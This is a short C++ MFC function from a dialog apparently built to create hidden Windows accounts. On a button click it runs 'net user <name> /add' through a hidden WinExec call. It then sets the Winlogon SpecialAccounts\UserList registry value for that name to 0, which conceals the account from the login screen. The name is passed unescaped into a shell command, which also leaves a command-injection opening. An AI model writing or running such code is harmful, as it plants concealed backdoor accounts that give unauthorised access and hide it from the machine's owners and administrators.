void CHideUserDlg::OnButton1() 
{
	UpdateData(TRUE);
	if(m_UserName=="")
	{
		MessageBox("输入用户名！");
		return;
	}

	unsigned long a=0;
	CString g;
	g.Format("net user %s /add",m_UserName);
	WinExec(g,0);
	HKEY hkey=NULL;
	RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",&hkey);
	::RegSetValueEx(hkey,m_UserName,0,REG_DWORD,(const unsigned char *)&a,sizeof(a));
}

